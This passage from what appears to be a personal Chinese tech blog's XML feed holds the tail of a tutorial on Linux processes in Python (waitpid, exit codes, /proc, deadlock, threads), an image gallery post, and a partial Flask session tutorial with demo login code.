punctuation">(</span><span class="token punctuation">)</span>会立即返回子进程结束状态值.子进程的结束状态值由参数 status 定义返回,而子进程的进程识别码也会一并返回,如果不在意结束状态值,则参数 status 可以设成 NULL.waitpid<span class="token punctuation">(</span><span class="token punctuation">)</span> 如果执行成果则返回子进程的识别码<span class="token punctuation">(</span>pid<span class="token punctuation">)</span>,如果有错误发生,返回值 -1 ,失败原因存放在 error中各参数意义:    pid 参数pid为欲等待的子进程识别码            pid<span class="token operator">&lt;</span>-1:等待进程组号为pid绝对值的任何子进程.            pid<span class="token operator">=</span>-1:等待任何子进程            pid<span class="token operator">=</span>0: 等待进程组识别码与目前进程相同的任何子进程            pid<span class="token operator">></span>0:等待进程号为pid的子进程      *status:这个参数保存子进程的状态信息,有了它,父进程可以知道子进程为什么退出            WIFEXITED<span class="token punctuation">(</span>status<span class="token punctuation">)</span>:若为正常退出,则为真,此时可执行            WEXITSTATUS<span class="token punctuation">(</span>status<span class="token punctuation">)</span>:如果WIFEXITED<span class="token punctuation">(</span>status<span class="token punctuation">)</span>为真，则可以用该宏取得子进程exit<span class="token punctuation">(</span><span class="token punctuation">)</span>返回的结束代码            WIFSIGNALED<span class="token punctuation">(</span>status<span class="token punctuation">)</span>:如果子进程因为一个未捕获的信号而终止，它就返回真；否则返回假。            WTERMSIG<span class="token punctuation">(</span>status<span class="token punctuation">)</span>:如果WIFSIGNALED<span class="token punctuation">(</span>status<span class="token punctuation">)</span>为真，则可以用该宏获得导致子进程终止的信号代码            WIFSTOPPED<span class="token punctuation">(</span>status<span class="token punctuation">)</span>:如果当前子进程被暂停了，则返回真；否则返回假            WSTOPSIG<span class="token punctuation">(</span>status<span class="token punctuation">)</span>: 取使子进程暂停的信号编号             WIFCONTINUED<span class="token punctuation">(</span>wstatus<span class="token punctuation">)</span>:  returns <span class="token boolean">true</span> <span class="token keyword">if</span> the  child  process  was resumed by delivery of SIGCONT.        options:如果不想使用这些选项,可以设置为0                WNOHANG <span class="token keyword">:</span> 如果没有任何已经结束的子进程则马上返回, 不予以等待。                WUNTRACED: 如果子进程进入暂停执行情况则马上返回,但结束状态不予以理会。子进程的结束状态返回后存于 status,底下有几个宏可判别结束情况。                WCONTINUED:如果子进程接收到SINGCONT信号就发生返回.                这些参数可以用“<span class="token operator">|</span>”运算符连接起来使用<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>当一个子进程发生改变时(<code>stopped,continues or exits</code>),对于父进程来进,会有2个操作:</p><ul><li>得到一个<code>SIGCHLD</code>信号(子进程退出)</li><li>阻塞并调用<code>waitpid(2)/wait</code></li><li>默认情况下,<code>waitpad</code> 会一直阻塞到所有的子进程都退出为止,但是也可以设置特殊的<code>flag</code>来改变,比如:一个子进程被暂停(flag <code>WUNTRACED</code>) 或者子进程继续(flag <code>WCONTINUED</code>)</li></ul><p>python的实现</p><pre class="line-numbers language-python"><code class="language-python"><span class="token keyword">import</span> os<span class="token keyword">import</span> sys<span class="token keyword">import</span> signal<span class="token keyword">def</span> <span class="token function">waitpid</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span>    <span class="token punctuation">(</span>pid<span class="token punctuation">,</span> status<span class="token punctuation">)</span> <span class="token operator">=</span> os<span class="token punctuation">.</span>waitpid<span class="token punctuation">(</span><span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">,</span> os<span class="token punctuation">.</span>WUNTRACED <span class="token operator">|</span> os<span class="token punctuation">.</span>WCONTINUED<span class="token punctuation">)</span>    <span class="token comment" spellcheck="true"># 如果当前子进程被暂停,返回真,否则为假</span>    <span class="token keyword">if</span> os<span class="token punctuation">.</span>WIFSTOPPED<span class="token punctuation">(</span>status<span class="token punctuation">)</span><span class="token punctuation">:</span>        <span class="token comment" spellcheck="true"># 如果上面条件为真,WSTOPSIG可以拿到暂停 sigal信号值</span>        s <span class="token operator">=</span> <span class="token string">'stopped sig={}'</span><span class="token punctuation">.</span>format<span class="token punctuation">(</span>os<span class="token punctuation">.</span>WSTOPSIG<span class="token punctuation">(</span>status<span class="token punctuation">)</span><span class="token punctuation">)</span>    <span class="token comment" spellcheck="true"># 如果子进程接收到 SIGCONT 返回为真</span>    <span class="token keyword">elif</span> os<span class="token punctuation">.</span>WIFCONTINUED<span class="token punctuation">(</span>status<span class="token punctuation">)</span><span class="token punctuation">:</span>        s <span class="token operator">=</span> <span class="token string">'continued'</span>    <span class="token comment" spellcheck="true"># 如果子进程异常终止,返回真</span>    <span class="token keyword">elif</span> os<span class="token punctuation">.</span>WIFSIGNALED<span class="token punctuation">(</span>status<span class="token punctuation">)</span><span class="token punctuation">:</span>        s <span class="token operator">=</span> <span class="token string">'exited signal={}'</span><span class="token punctuation">.</span>format<span class="token punctuation">(</span>os<span class="token punctuation">.</span>WTERMSIG<span class="token punctuation">(</span>status<span class="token punctuation">)</span><span class="token punctuation">)</span>    <span class="token comment" spellcheck="true"># 如果自进程正常终止,返回真</span>    <span class="token keyword">elif</span> os<span class="token punctuation">.</span>WIFEXITED<span class="token punctuation">(</span>status<span class="token punctuation">)</span><span class="token punctuation">:</span>        s <span class="token operator">=</span> <span class="token string">'exited status={}'</span><span class="token punctuation">.</span>format<span class="token punctuation">(</span>os<span class="token punctuation">.</span>WEXITSTATUS<span class="token punctuation">(</span>status<span class="token punctuation">)</span><span class="token punctuation">)</span>    <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">'waitpid recevied:pid={},{}'</span><span class="token punctuation">.</span>format<span class="token punctuation">(</span>pid<span class="token punctuation">,</span> s<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token keyword">if</span> __name__ <span class="token operator">==</span> <span class="token string">'__main__'</span><span class="token punctuation">:</span>    <span class="token triple-quoted-string string">"""os.fork会创建一个子进程 然后父进程和子进程都会从fork()函数中得到一个返回值"""</span>    <span class="token comment" spellcheck="true"># 子进程为0,父进程为子进程的 pid</span>    childpid <span class="token operator">=</span> os<span class="token punctuation">.</span>fork<span class="token punctuation">(</span><span class="token punctuation">)</span>    <span class="token keyword">if</span> childpid <span class="token operator">==</span> <span class="token number">0</span><span class="token punctuation">:</span>        <span class="token comment" spellcheck="true"># 子进程</span>        os<span class="token punctuation">.</span>kill<span class="token punctuation">(</span>os<span class="token punctuation">.</span>getpid<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">,</span> signal<span class="token punctuation">.</span>SIGSTOP<span class="token punctuation">)</span>        sys<span class="token punctuation">.</span>exit<span class="token punctuation">(</span><span class="token punctuation">)</span>    waitpid<span class="token punctuation">(</span><span class="token punctuation">)</span>    os<span class="token punctuation">.</span>kill<span class="token punctuation">(</span>childpid<span class="token punctuation">,</span> signal<span class="token punctuation">.</span>SIGCONT<span class="token punctuation">)</span>    waitpid<span class="token punctuation">(</span><span class="token punctuation">)</span>    waitpid<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token triple-quoted-string string">"""waitpid recevied:pid=30322,stopped sig=19waitpid recevied:pid=30322,continuedwaitpid recevied:pid=30322,exited status=0"""</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>它的控制流程为如下:</p><p><img src="https://cdn.jsdelivr.net/gh/ningwenyan/My_chat_picgo/2020-9-26/1601131118533-10019.png"></p><p><code>zombie</code>进程:它是一个没有成功退出的进程,它的状态的改变没有得到父进程的承认,也就是说父进程并没有调用<code>wait()/waitpid()</code>方法</p></blockquote><h3 id="11-退出码"><a href="#11-退出码" class="headerlink" title="11.退出码"></a>11.退出码</h3><blockquote><p>任何进程退出时,都会留下退出码,操作系统会根据退出码可以知道进程是否正常运行.</p><p>退出吗是(0-255)的整数,0表示正常退出,其他数字表示不同的错误.</p><p>对于<code>python</code> 而言,<code>sys.exit()</code> 用来接受退出码.</p><p>在bash中可以使用它特殊变量<code>$?</code> 来确认上次退出的退出码</p><pre class="line-numbers language-bash"><code class="language-bash"><span class="token punctuation">(</span>learnpy<span class="token punctuation">)</span> kning@kning-pc:~$ python -c <span class="token string">""</span><span class="token punctuation">;</span><span class="token keyword">echo</span> <span class="token variable">$?</span>0<span class="token punctuation">(</span>learnpy<span class="token punctuation">)</span> kning@kning-pc:~$ python -c <span class="token string">"import sys;sys.exit(0)"</span><span class="token punctuation">;</span><span class="token keyword">echo</span> <span class="token variable">$?</span>0<span class="token punctuation">(</span>learnpy<span class="token punctuation">)</span> kning@kning-pc:~$ python -c <span class="token string">"import sys;sys.exit(43)"</span><span class="token punctuation">;</span><span class="token keyword">echo</span> <span class="token variable">$?</span>43<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>在python中可以使用<code>errno</code> 模块中定义的标准退出码</p><pre class="line-numbers language-python"><code class="language-python"><span class="token keyword">import</span> sys<span class="token punctuation">,</span>errnoa <span class="token operator">=</span> <span class="token number">1</span><span class="token keyword">if</span> a<span class="token operator">></span><span class="token number">0</span><span class="token punctuation">:</span> <span class="token keyword">print</span><span class="token punctuation">(</span>a<span class="token punctuation">)</span><span class="token keyword">else</span><span class="token punctuation">:</span> sys<span class="token punctuation">.</span>exit<span class="token punctuation">(</span>errno<span class="token punctuation">.</span>EACCES<span class="token punctuation">)</span><span class="token triple-quoted-string string">"""$ python backkey.py     1   # 非0"""</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><hr><p>退出码的意义:比如编写<code>shell</code> 脚本时,都是根据前一个命令的退出码来选择是否执行下一个命令.</p><p><code>Docker</code>使用<code>dockfile</code> 来构建镜像,这是类似<code>shell</code> 的命令,前一个命令执行成功,后一个命令接受到返回码才会继续执行下一条命令.</p></blockquote><h3 id="12-进程文件"><a href="#12-进程文件" class="headerlink" title="12.进程文件"></a>12.进程文件</h3><blockquote><p>在linux中一切皆文件,进程的一切运行信息,都是可以在文件系统中找到的.比如查看<code>PID</code>为1的进程信息.</p><pre class="line-numbers language-bash"><code class="language-bash"><span class="token function">ls</span>         /proc/1/<span class="token function">cat</span>         /proc/1/status<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre></blockquote><h3 id="13-死锁-活锁"><a href="#13-死锁-活锁" class="headerlink" title="13.死锁/活锁"></a>13.死锁/活锁</h3><blockquote><p>死锁:指两个或两个以上的进程在执行过程中,因争夺资源造成的一种互相等待的现象.若没有外力的作用,他们将无法推进下去.此时称系统处于死锁状态或系统产生了死锁.这些互相等待的进程称为死锁进程.例如:一个进程拿着资源A请求资源B,另一个进程拿着资源B请求资源A,双方都不释放资源,导致死锁.</p><p>活锁:进程A和进程B都不认为自己的优先级高,对资源R,一直互相谦让,导致活锁,活锁的进程是没有阻塞的,会继续使用CPU</p><p>饥饿:如果事务T1封锁了数据R,事务T2又请求封锁数据R,于是T2等待,T3也请求封锁R,当T1释放了R上的锁后,系统首先批准了T3的请求,T2仍在等待.然后T4又请求封锁R,T3释放之后,系统批转了T4的请求…..T2可能永远等待.</p></blockquote><h3 id="14-线程"><a href="#14-线程" class="headerlink" title="14.线程"></a>14.线程</h3><blockquote><p><code>thread</code>:线程,线程是操作系统能够运行调度的最小单位,大部分情况下,它被包含在进程之中,是进程的实际运作单位,一条线程指的是进程中一个单一顺序的控制流,一个进程可以并发多个线程,每个线程执行不同的任务.同一进程内的多条线程将共享进程中的全部系统资源,如虚拟地址空间,文件描述符,信号处理等等,但是每个线程都有各自的调用栈,自己的寄存器环境,自己的线程本地存储</p><p>在多核或多CPU上使用多线程程序可以提高程序的吞吐率</p><p>在单核或单CPU上使用多线程,也可以把进程中负责<code>I/O</code> 处理,人机交互而常常被阻塞的部分与计算的部分分开执行,从而提高程序的执行效率.</p></blockquote><p><img src="https://cdn.jsdelivr.net/gh/ningwenyan/My_chat_picgo/wechat.png" alt="wechat"></p><script type="text/javascript" src="https://cdn.jsdelivr.net/npm/kity@2.0.4/dist/kity.min.js"></script><script type="text/javascript" src="https://cdn.jsdelivr.net/npm/kityminder-core@1.4.50/dist/kityminder.core.min.js"></script><script defer="true" type="text/javascript" src="https://cdn.jsdelivr.net/npm/hexo-simple-mindmap@0.2.0/dist/mindmap.min.js"></script><link rel="stylesheet" type="text/css" href="https://cdn.jsdelivr.net/npm/hexo-simple-mindmap@0.2.0/dist/mindmap.min.css">]]></content>
      
      
      <categories>
          
          <category> Python </category>
          
      </categories>
      
      
        <tags>
            
            <tag> python </tag>
            
            <tag> threading </tag>
            
            <tag> process </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>少女雨滴</title>
      <link href="/posts/42481.html"/>
      <url>/posts/42481.html</url>
      
        <content type="html"><![CDATA[<p><img src="https://tva1.sinaimg.cn/large/a20ab060ly1gj1s37dz7sj20u00hf415.jpg"><br><img src="https://tva1.sinaimg.cn/large/a20ab060ly1gj1s37vcv1j20lw12wgoj.jpg"><br><img src="https://tva1.sinaimg.cn/large/a20ab060ly1gj1s37eqgpj20tv168wl2.jpg"><br><img src="https://tva1.sinaimg.cn/large/a20ab060ly1gj1s37eb97j20i20ph0uh.jpg"><br><img src="https://tva1.sinaimg.cn/large/a20ab060ly1gj1s37enrfj20it0q00v0.jpg"><br><img src="https://tva1.sinaimg.cn/large/a20ab060ly1gj1s37ewyxj20rs12awkn.jpg"><br><img src="https://tva1.sinaimg.cn/large/a20ab060ly1gj1s37fo2oj20p00zfq87.jpg"><br><img src="https://tva1.sinaimg.cn/large/a20ab060ly1gj1s37grlgj20u00l8ad1.jpg"><br><img src="https://tva1.sinaimg.cn/large/a20ab060ly1gj1s37h8hij20rl0lcwhh.jpg"><br><img src="https://tva1.sinaimg.cn/large/a20ab060ly1gj1s37hw6wj20u00sbgp7.jpg"><br><img src="https://tva1.sinaimg.cn/large/a20ab060ly1gj1s37j58zj20u0147n38.jpg"><br><img src="https://tva1.sinaimg.cn/large/a20ab060ly1gj1s37m73ij20o60y677q.jpg"><br><img src="https://tva1.sinaimg.cn/large/a20ab060ly1gj1s37oc2sj20u0160mzy.jpg"></p><p><img src="https://cdn.jsdelivr.net/gh/ningwenyan/My_chat_picgo/wechat.png" alt="wechat"></p><script type="text/javascript" src="https://cdn.jsdelivr.net/npm/kity@2.0.4/dist/kity.min.js"></script><script type="text/javascript" src="https://cdn.jsdelivr.net/npm/kityminder-core@1.4.50/dist/kityminder.core.min.js"></script><script defer="true" type="text/javascript" src="https://cdn.jsdelivr.net/npm/hexo-simple-mindmap@0.2.0/dist/mindmap.min.js"></script><link rel="stylesheet" type="text/css" href="https://cdn.jsdelivr.net/npm/hexo-simple-mindmap@0.2.0/dist/mindmap.min.css">]]></content>
      
      
      <categories>
          
          <category> 少女雨滴 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> pivix </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Flask session学习</title>
      <link href="/posts/50838.html"/>
      <url>/posts/50838.html</url>
      
        <content type="html"><![CDATA[<p><img src="https://cdn.jsdelivr.net/gh/ningwenyan/My_chat_picgo/2020-9-24/1600958410193-10299.png" alt="10299"></p><h2 id="HTTP-Session"><a href="#HTTP-Session" class="headerlink" title="HTTP Session"></a><code>HTTP Session</code></h2><h3 id="1-什么是Session"><a href="#1-什么是Session" class="headerlink" title="1.什么是Session"></a>1.什么是<code>Session</code></h3><blockquote><p><code>Session</code> 中文翻译是会话.和<code>Cookie</code> 类似,它也是用来保存用户状态的.<code>Cookie</code> 有它的弊端,本身保存在客户端(如浏览器),而且是一个可读明文文件.这就意味着它很容易遭受伪装攻击(例如黑客B作为中间人伪造了A的<code>Cookie</code> 信息,发起转账服务).为了解决类似这样的问题,<code>Session</code> 被被开发使用.</p><p><code>Session</code>是一个思路/概念,一个服务器存储授权信息的解决方案,不同的服务器,不同的框架,不同的语言有不同的实现,虽然实现不一样,但是他们的目的都是服务器为了方便存储数据的.</p><p>先来看一下<code>Cookie</code> 是如何工作的(基于无状态的<code>HTTP</code>协议).</p><p><code>Cookie</code> 最常用用于登录和登出操作.下面以<code>google</code>登陆为例来看实际中如如何登陆的:</p><ol><li>浏览器先向<code>www.google.com</code>的服务器发送一个<code>HTTP</code> 请求.通常是一个<code>POST</code> 请求,包含用户名和密码.</li><li>请求到达服务器后,服务器会验证用户的合法性.如果验证成功,服务器会给浏览器发送一个<code>Response with cookie</code>(通常是一个<code>GUID</code>或者任何服务器的唯一标识)<ul><li><code>Cookie</code>会放置在<code>Response head</code> 的<code>Set-Cookie</code> 字段中</li></ul></li><li>浏览器在收到<code>Respnse with cookie</code> 后,会把<code>Cookie</code>保存在磁盘中(和<code>Cookie</code>的过期时效有关)</li><li>此后,如果用户在同一浏览器中的新标签页访问<code>www.google.com</code>,浏览器会在<code>Response</code> 中自动带上<code>cookie</code></li><li><code>google.com</code>服务器在读到这个<code>cookie</code>时会验证它的合法性.服务器通常都会在内存里维护一个所有它生成的 <code>Cookie</code> 的字典.通常用<code>sessionID</code>为键,<code>UserID</code> 或者其他标识用户信息的内容作为值.</li><li>在认证完用户后,服务器就可以给用户发送自定义的动态页面.通常都包含该用户的特殊信息(如名字,头像,好友列表,活动订阅等等)</li></ol><p>在基于<code>Cookie</code> 的基础上,服务器返回的是不是简单的键值对,而是在服务器端生成<code>Session</code>,它包含了<code>Session_ID</code>用来唯一标识用户,并包含了生命周期等字段.</p><ol><li>浏览器先向<code>www.google.com</code>的服务器发送一个<code>HTTP</code> 请求.通常是一个<code>POST</code> 请求,包含用户名和密码.</li><li>请求到达服务器后,服务器会验证用户的合法性.如果验证成功,服务器会创建一个<code>Session</code> ,它包含一个唯一标识用户的<code>Session_ID</code>(它的值是一个既不会重复,又不容易找到规律的字符串),通常服务器会把<code>Session_ID</code> 和<code>用户</code>的对应 保存在数据库中,如<code>MySQL\radis\Memcached</code>等等(他们都是保存在服务器本地的.)</li><li>服务器给浏览器发送<code>Response with cookie</code>(<code>cookie</code> 中包含<code>Session_ID</code>)</li><li>浏览器在收到<code>Respnse with cookie</code> 后,会把<code>Cookie</code>保存在磁盘中.</li><li>此后,如果用户在同一浏览器中的新标签页访问<code>www.google.com</code>,浏览器会在<code>Response</code> 中自动带上<code>cookie</code></li></ol></blockquote><h3 id="2-在Flask中使用Session"><a href="#2-在Flask中使用Session" class="headerlink" title="2.在Flask中使用Session"></a>2.在<code>Flask</code>中使用<code>Session</code></h3><blockquote><p>在<code>Flask</code>的原生<code>Session</code> 中,并不是保存<code>Session_ID</code>,而是将<code>session</code>数据加密,然后存储在<code>cookie</code>中.</p><pre class="line-numbers language-python"><code class="language-python"><span class="token operator">>></span><span class="token operator">></span> <span class="token keyword">from</span> flask <span class="token keyword">import</span> session<span class="token operator">>></span><span class="token operator">></span> type<span class="token punctuation">(</span>session<span class="token punctuation">)</span><span class="token operator">&lt;</span><span class="token keyword">class</span> <span class="token string">'werkzeug.local.LocalProxy'</span><span class="token operator">></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre><p><code>session</code> 是一个类似字典的对象,它支持字典的操作方法(比如<code>pop()/get()</code>等).</p><p>在<code>Flask</code>中要使用<code>session</code>,必须设置一个秘钥用于加密,为了更加安全,可以使用<code>os.urange(24)</code> 生成一个24位的随机字符串.</p><p>它的简单示例如下(参考:<a href="https://github.com/ningwenyan/demo_code/tree/master/flask_demo_code/T19" target="_blank" rel="noopener">https://github.com/ningwenyan/demo_code/tree/master/flask_demo_code/T19</a>):</p><pre class="line-numbers language-python"><code class="language-python"><span class="token keyword">from</span> flask <span class="token keyword">import</span> Flask<span class="token keyword">from</span> flask <span class="token keyword">import</span> session<span class="token punctuation">,</span>escape<span class="token keyword">from</span> flask <span class="token keyword">import</span> request<span class="token punctuation">,</span>redirect<span class="token punctuation">,</span>url_for<span class="token keyword">import</span> osapp <span class="token operator">=</span> Flask<span class="token punctuation">(</span>__name__<span class="token punctuation">)</span>app<span class="token punctuation">.</span>config<span class="token punctuation">.</span>update<span class="token punctuation">(</span><span class="token punctuation">{</span><span class="token string">'DEBUG'</span><span class="token punctuation">:</span><span class="token boolean">True</span><span class="token punctuation">,</span><span class="token string">'TEMPLATES_AUTO_RELOAD'</span><span class="token punctuation">:</span><span class="token boolean">True</span><span class="token punctuation">,</span><span class="token comment" spellcheck="true"># 使用session必须设置秘钥</span><span class="token string">'SECRET_KEY'</span><span class="token punctuation">:</span>os<span class="token punctuation">.</span>urandom<span class="token punctuation">(</span><span class="token number">24</span><span class="token punctuation">)</span> <span class="token comment" spellcheck="true"># 生成24位随机数</span><span class="token punctuation">}</span><span class="token punctuation">)</span><span class="token comment" spellcheck="true"># 也可以使用如下方法创建 secret_key</span><span class="token comment" spellcheck="true"># app.secret_key=os.urandom(24)</span>@app<span class="token punctuation">.</span>route<span class="token punctuation">(</span><span class="token string">'/'</span><span class="token punctuation">)</span><span class="token keyword">def</span> <span class="token function">index</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span>        <span class="token keyword">if</span> <span class="token string">'username'</span> <span class="token keyword">in</span> session<span class="token punctuation">:</span>                <span class="token comment" spellcheck="true"># escape 用来替换html中的16进制特殊符号</span>                <span class="token keyword">return</span> <span class="token string">'Logged in as {}.&lt;a href="/logout/">Logout&lt;/a>'</span><span class="token punctuation">.</span>format<span class="token punctuation">(</span>escape<span class="token punctuation">(</span>session<span class="token punctuation">.</span>get<span class="token punctuation">(</span><span class="token string">'username'</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span>           <span class="token keyword">return</span> <span class="token string">'You are not logged in.&lt;a href="/login/">Login&lt;/a>'</span>@app<span class="token punctuation">.</span>route<span class="token punctuation">(</span><span class="token string">'/login/'</span><span class="token punctuation">,</span>methods<span class="token operator">=</span><span class="token punctuation">[</span><span class="token string">'GET'</span><span class="token punctuation">,</span><span class="token string">'POST'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token keyword">def</span> <span class="token function">login</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span>        <span class="token keyword">if</span> request<span class="token punctuation">.</span>method <span class="token operator">==</span> <span class="token string">'POST'</span><span class="token punctuation">:</span>            session<span class="token punctuation">[</span><span class="token string">'username'</span><span class="token punctuation">]</span> <span class="token operator">=</span> request<span class="token punctuation">.</span>form<span class="token punctuation">.</span>get<span class="token punctuation">(</span><span class="token string">'username'</span><span class="token punctuation">)</span>            <span class="token keyword">return</span> redirect<span class="token punctuation">(</span>url_for<span class="token punctuation">(</span><span class="token string">'index'</span><span class="token punctuation">)</span><span class="token punctuation">)</span>        login_html <span class="token operator">=</span> <span class="token triple-quoted-string string">"""            &lt;form action="" method="POST">            &lt;p>&lt;input type=text name=username>&lt;/p>            &lt;p>&lt;input type=submit value=Login>&lt;/p>            &lt;/form>            """</span>            <span class="token keyword">return</span>  login_html@app<span class="token punctuation">.</span>route<span class="token punctuation">(</span><span class="token string">'/logout/'</span><span class="token punctuation">)</span><span class="token keyword">def</span> <span class="token function">logout</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span>    <span class="token triple-quoted-string string">"""删除 session"""</span>    session<span class="token punctuation">.</span>pop<span class="token punctuation">(</span><span class="token string">'username'</span><span class="token punctuation">,</span>None<span class="token punctuation">)</span>    <span class="token keyword">return</span> redirect<span class="token punctuation">(</span>url_for<span class="token punctuation">(</span><span class="token string">'index'</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token keyword">if</span> __name__ <span class="token operator">==</span> <span class="token string">'__main__'</span><span class="token punctuation">:</span>        app<span class="token punctuation">.</span>run<span class="token punctuation">(</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>以上基本包含了<code>session</code> 的创建,读取和删除操作.</p><p>删除所有的<code>session</code> 可以使用<code>session.clear()</code> .</p><p>使用浏览器访问<code>http://127.0.0.1:5000</code> ,可以查看<code>session</code> 的过程.</p><ol><li>访问<code>http://127.0.0.1:5000</code> ,此时并没有产生<code>session</code></li></ol><p><img src="https://cdn.jsdelivr.net/gh/ningwenyan/My_chat_picgo/2020-9-24/1600958657883-10038.png"></p><ol start="2"><li>点击<code>login</code> 后,<code>GET</code> 请求跳转到<code>login</code>页面.没有生成<code>session</code></li></ol><p><img src="https://cdn.jsdelivr.net/gh/ningwenyan/My_chat_picgo/2020-9-24/1600958675176-10039.png"></p><ol start="3"><li>填写用户名<code>submit</code> 之后,使用<code>POST</code>请求提交到服务器,服务器生成<code>session</code>并加密返回<code>cookie</code>,由于后台代码中有跳转到首页,它会跳转一次,但是会携带<code>cookie</code>跳转.</li></ol><p><img src="https://cdn.jsdelivr.net/gh/ningwenyan/My_chat_picgo/2020-9-24/1600958702161-10040.png"><br><img src="https://cdn.jsdelivr.net/gh/ningwenyan/My_chat_picgo/2020-9-24/1600958702157-10041.png"></p><ol start="4"><li>点击<code>logout</code> 后,登出系统,测试服务器删除<code>session</code></li></ol><p><img src="https://cdn.jsdelivr.net/gh/ningwenyan/My_chat_picgo/2020-9-24/1600958740302-10044.png"><br><img src="https://cdn.jsdelivr.net/gh/ningwenyan/My_chat_picgo/2020-9-24/1600958740312-10042.png"></p></blockquote><h3 id="3-session-设置超时时间"><a href="#3-session-设置超时时间" class="headerlink" title="3.session 设置超时时间."></a>3.<code>session</code> 设置超时时间.</h3><blockquote><p>如上,可以看到在服务器端<code>session</code>对<code>cookie</code> 做了一层封装.<code>session</code>当然也支持过期时间操作.</p><p>如果没有指定session的过期时间,那么默认是浏览器关闭后就自动结束.在<code>Flask</code>中,</p><ul><li>通过设置<code>session.permanent=True</code> ,这个参数会延长到31天.</li><li>可以通过给<code>app.config</code>设置<code>PERMANENT_SESSION_LIFETIME</code>来更改过期时间,这个值的数据类型是<code>datetime.timedelay</code>类型.</li><li>它一般用于登录页面的<code>记住我</code>选项.点击选项会设置更长的时间.</li></ul><pre class="line-numbers language-python"><code class="language-python"><span class="token keyword">from</span> flask <span class="token keyword">import</span> Flask<span class="token keyword">from</span> flask <span class="token keyword">import</span> session<span class="token punctuation">,</span>escape<span class="token keyword">from</span> flask <span class="token keyword">import</span> request<span class="token punctuation">,</span>redirect<span class="token punctuation">,</span>url_for<span class="token keyword">import</span> os<span class="token keyword">from</span> datetime <span class="token keyword">import</span> timedeltaapp <span class="token operator">=</span> Flask<span class="token punctuation">(</span>__name__<span class="token punctuation">)</span>app<span class="token punctuation">.</span>config<span class="token punctuation">.</span>update<span class="token punctuation">(</span><span class="token punctuation">{</span>    <span class="token string">'DEBUG'</span><span class="token punctuation">:</span><span class="token boolean">True</span><span class="token punctuation">,</span>    <span class="token string">'TEMPLATES_AUTO_RELOAD'</span><span class="token punctuation">:</span><span class="token boolean">True</span><span class="token punctuation">,</span>    <span class="token comment" spellcheck="true"># 使用session必须设置秘钥</span>    <span class="token string">'SECRET_KEY'</span><span class="token punctuation">:</span>os<span class="token punctuation">.</span>urandom<span class="token punctuation">(</span><span class="token number">24</span><span class="token punctuation">)</span><span class="token punctuation">,</span> <span class="token comment" spellcheck="true"># 生成24位随机数</span>    <span class="token comment" spellcheck="true"># 设置超时时间</span>    <span class="token string">'PERMANENT_SESSION_LIFETIME'</span><span class="token punctuation">:</span> timedelta<span class="token punctuation">(</span>days<span class="token operator">=</span><span class="token number">7</span><span class="token punctuation">)</span><span class="token punctuation">}</span><span class="token punctuation">)</span><span class="token comment" spellcheck="true"># 也可以使用如下方法创建 secret_key</span><span class="token comment" spellcheck="true"># app.secret_key=os.urandom(24)</span>@app<span class="token punctuation">.</span>route<span class="token punctuation">(</span><span class="token string">'/'</span><span class="token punctuation">)</span><span class="token keyword">def</span> <span class="token function">index</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span>    <span class="token keyword">if</span> <span class="token string">'username'</span> <span class="token keyword">in</span> session<span class="token punctuation">:</span>        <span class="token comment" spellcheck="true"># escape 用来替换html中的16进制特殊符号</span>        <span class="token keyword">return</span> <span class="token string">'Logged in as {}.&lt;a href="/logout/">Logout&lt;/a>'</span><span class="token punctuation">.</span>format<span class="token punctuation">(</span>escape<span class="token punctuation">(</span>session<span class="token punctuation">.</span>get<span class="token punctuation">(</span><span class="token string">'username'</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span>    <span class="token keyword">return</span> <span class="token string">'You are not logged in.&lt;a href="/login/">Login&lt;/a>'</span>@app<span class="token punctuation">.</span>route<span class="token punctuation">(</span><span class="token string">'/login/'</span><span class="token punctuation">,</span>methods<span class="token operator">=</span><span class="token punctuation">[</span><span class="token string">'GET'</span><span class="token punctuation">,</span><span class="token string">'POST'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token keyword">def</span> <span class="token function">login</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span>    <span class="token keyword">if</span> request<span class="token 